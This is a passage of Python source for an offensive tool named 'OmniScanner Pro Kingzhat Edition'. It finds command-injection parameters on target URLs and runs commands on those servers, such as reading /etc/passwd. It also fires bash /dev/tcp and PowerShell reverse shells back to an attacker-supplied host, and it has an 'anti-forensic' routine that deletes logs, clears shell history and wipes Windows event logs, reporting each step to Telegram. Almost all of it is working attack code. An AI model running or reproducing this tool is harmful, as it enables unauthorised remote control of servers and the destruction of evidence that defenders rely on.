    def scan_txt_file(self, filepath):
        """
        Scan a local .txt file for targets and URLs
        
        Args:
            filepath: Path to the .txt file to scan
            
        Returns:
            list: Found targets/URLs
        """
        self.log(f"Scanning local TXT file: {filepath}", "info")
        targets = self.extract_urls_from_txt(filepath)
        
        if targets:
            self.log(f"Found {len(targets)} targets in {filepath}", "success")
            for target in targets[:10]:  # Show first 10
                self.log(f"  -> {target}", "exp")
            if len(targets) > 10:
                self.log(f"  ... and {len(targets) - 10} more", "info")
        else:
            self.log(f"No targets found in {filepath}", "warning")
        
        return targets

    def scan_multiple_txt_files(self, directory='.'):
        """
        Scan all .txt files in a directory
        
        Args:
            directory: Directory to scan for .txt files
            
        Returns:
            dict: Mapping of files to their found targets
        """
        self.log(f"Scanning .txt files in directory: {directory}", "info")
        all_targets = {}
        
        try:
            for filename in os.listdir(directory):
                if filename.endswith('.txt'):
                    filepath = os.path.join(directory, filename)
                    targets = self.extract_urls_from_txt(filepath)
                    if targets:
                        all_targets[filename] = targets
                        self.log(f"{filename}: {len(targets)} targets", "success")
        except Exception as e:
            self.log(f"Error scanning directory: {e}", "error")
        
        if all_targets:
            total = sum(len(t) for t in all_targets.values())
            self.log(f"Total: {total} targets from {len(all_targets)} files", "success")
        
        return all_targets

    def detect_rce_parameter(self):
        """Auto-detect RCE-vulnerable parameters"""
        self.log("Auto-detecting RCE parameters...")
        
        # Test payloads
        linux_test = "echo KINGZHAT_TEST"
        windows_test = "echo KINGZHAT_TEST"
        
        for param in self.common_params:
            try:
                # Test Linux
                r = self.session.get(
                    self.target, 
                    params={param: linux_test}, 
                    headers=self.get_headers(), 
                    timeout=5
                )
                
                if "KINGZHAT_TEST" in r.text:
                    self.log(f"Found RCE Parameter (Linux): {param}", "success")
                    self.found_params.append({"param": param, "os": "linux"})
                    continue
                
                # Test Windows
                r = self.session.get(
                    self.target, 
                    params={param: windows_test}, 
                    headers=self.get_headers(), 
                    timeout=5
                )
                
                if "KINGZHAT_TEST" in r.text:
                    self.log(f"Found RCE Parameter (Windows): {param}", "success")
                    self.found_params.append({"param": param, "os": "windows"})
                    
            except Exception as e:
                if self.verbose:
                    self.log(f"Error testing param {param}: {e}", "info")
                continue
        
        if not self.found_params:
            self.log("No vulnerable parameters found", "warning")
        
        return self.found_params

    def execute_rce(self, param, os_type=None):
        """Execute RCE on target"""
        if os_type is None:
            os_type = self.os_type
        
        self.log(f"Executing RCE with parameter: {param}")
        
        if os_type == "Windows":
            # Windows payloads
            payloads = [
                "whoami",
                "whoami /all",
                "systeminfo",
                "ipconfig /all",
                "net user",
                "echo %USERNAME%",
            ]
            revshell = f"powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
        else:
            # Linux payloads
            payloads = [
                "whoami",
                "id",
                "uname -a",
                "cat /etc/passwd",
                "pwd",
                "echo $USER",
            ]
            revshell = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        
        # Execute test payloads
        for payload in payloads:
            try:
                r = self.session.get(
                    self.target,
                    params={param: payload},
                    headers=self.get_headers(),
                    timeout=5
                )
                if payload in r.text or "error" not in r.text.lower():
                    self.log(f"Payload works: {payload[:30]}...", "success")
            except:
                pass
        
        # Try reverse shell if lhost provided
        if self.lhost and self.lport:
            self.log(f"Attempting reverse shell to {self.lhost}:{self.lport}", "warning")
            try:
                self.session.get(
                    self.target,
                    params={param: revshell},
                    headers=self.get_headers(),
                    timeout=3
                )
            except:
                pass
            
            self.send_telegram(f"🔥 *RCE EXECUTED*\nTarget: `{self.target}`\nParam: `{param}`\nOS: `{os_type}`")

    def anti_forensic_cleanup(self):
        """Anti-forensic cleanup commands"""
        self.log("Executing anti-forensic cleanup...", "warning")
        
        linux_cleanup = [
            "rm -rf /tmp/*.log",
            "rm -rf /var/tmp/*",
            "history -c",
            "export HISTSIZE=0",
            "rm -f ~/.bash_history",
        ]
        
        windows_cleanup = [
            "del /q /s *.log",
            "del /q /s *.tmp",
            "wevtutil cl Security",
            "wevtutil cl System",
        ]
        
        cleanup = linux_cleanup if self.os_type == "Linux" else windows_cleanup
        final_cmd = " ; ".join(cleanup) if self.os_type == "Linux" else " & ".join(cleanup)
        
        for param in self.found_params:
            try:
                self.session.get(
                    self.target,
                    params={param["param"]: final_cmd},
                    headers=self.get_headers(),
                    timeout=5
                )
            except:
                pass
        
        self.send_telegram("👻 *Ghost Protocol Executed*")

    def run_nuclei(self, severity="critical,high"):
        """Run Nuclei CVE scan"""
        self.log(f"Launching Nuclei CVE Scan (severity: {severity})...")
        
        if not shutil_which("nuclei"):
            self.log("Nuclei not found in PATH", "warning")
            return
        
        try:
            cmd = ["nuclei", "-u", self.target, "-severity", severity, "-silent", "-nc", "-json"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.stdout:
                # Parse JSON output
                for line in result.stdout.strip().split('\n'):
                    try:
                        data = json.loads(line)
                        self.log(f"Nuclei: {data.get('template', 'unknown')}", "warning")
                        self.vulnerabilities.append({
                            "type": "CVE",
                            "template": data.get('template', ''),
                            "url": data.get('host', ''),
                            "severity": data.get('severity', 'unknown')
                        })
                    except:
                        pass
                
                self.send_telegram(f"🛡️ *Nuclei Found*\n{len(self.vulnerabilities)} vulnerabilities")
            
        except subprocess.TimeoutExpired:
            self.log("Nuclei scan timed out", "warning")
        except FileNotFoundError:
            self.log("Nuclei not found", "warning")
        except Exception as e:
            self.log(f"Nuclei error: {e}", "error")

    def run_nuclei_template(self, template_name):
        """Run specific Nuclei template"""
        self.log(f"Running Nuclei template: {template_name}")
        
        if not shutil_which("nuclei"):
            self.log("Nuclei not found", "warning")
            return
        
        try:
            cmd = ["nuclei", "-u", self.target, "-t", template_name, "-silent", "-nc"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0 and result.stdout:
                self.log(f"Template matched: {template_name}", "success")
                return True
        except Exception as e:
            if self.verbose:
                self.log(f"Template error: {e}", "info")
        return False

    def save_report(self):
        """Save scan results to JSON report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        domain = urllib.parse.urlparse(self.target).netloc.replace(':', '_')
        filename = f"reports/{domain}_{timestamp}.json"
        
        report = {
            "target": self.target,
            "scan_time": timestamp,
            "os_type": self.os_type,
            "vulnerabilities": self.vulnerabilities,
            "found_params": self.found_params,
            "vuln_count": len(self.vulnerabilities)
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.log(f"Report saved: {filename}", "success")
        return filename

    def start(self):
        """Main scan execution"""
        self.banner()
        
        # Initial checks
        self.detect_os()
        self.detect_waf()
        
        self.send_telegram(f"📡 *Scan Started*\nTarget: {self.target}\nOS: {self.os_type}")
        
        # Phase 1: Fuzzing
        self.log("Starting fuzzing phase...", "info")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            list(executor.map(self.fuzzer, self.fuzz_list))
        
        # Phase 2: AGUS Vulnerability Scanner
        self.run_agus_scan()
        
        # Phase 3: Auto-detect RCE parameters
        self.detect_rce_parameter()
        
        # Phase 4: Execute RCE if parameters found
        if self.found_params:
            for param_info in self.found_params:
                self.execute_rce(param_info["param"], param_info.get("os"))
        
        # Phase 5: Nuclei scan
        if shutil_which("nuclei"):
            self.run_nuclei()
        
        # Phase 6: Save report
        self.save_report()
        
        # Summary
        self.log("="*50, "info")
        self.log(f"Scan Complete!", "success")
        self.log(f"Vulnerabilities Found: {len(self.vulnerabilities)}", "warning")
        self.log(f"RCE Parameters: {len(self.found_params)}", "success")
        self.send_telegram(f"✅ *Scan Complete*\nTarget: {self.target}\nVulns: {len(self.vulnerabilities)}\nRCE Params: {len(self.found_params)}")


def shutil_which(cmd):
    """Check if command exists (cross-platform)"""
    import shutil
    return shutil.which(cmd) is not None


def main():
    parser = argparse.ArgumentParser(
        description="OmniScanner Pro V6.4 - Kingzhat Edition",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Examples:
  python omireccon.py -u http://target.com
  python omireccon.py -u http://target.com -lh 192.168.0.0 -lp 4444
  python omireccon.py -u http://target.com -p cmd -v
        """
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", help="RCE Parameter (auto-detect if not provided)")
    parser.add_argument("-lh", "--lhost", help="Local IP for Reverse Shell")
    parser.add_argument("-lp", "--lport", help="Local Port for Reverse Shell")
    parser.add_argument("-id", "--chatid", help="Telegram Chat ID")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Threads (default: 20)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--nuclei", action="store_true", help="Run Nuclei scan (requires nuclei binary)")

    if len(sys.argv) == 1:
        OmniScannerPro.banner()
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    
    scanner = OmniScannerPro(
        args.url, 
        args.param, 
        args.lhost, 
        args.lport, 
        args.threads,
        args.chatid,
        args.verbose
    )
    
    if args.nuclei and not shutil_which("nuclei"):
        scanner.log("Nuclei not found, skipping...", "warning")
    
    scanner.start()


if __name__ == "__main__":
    main()

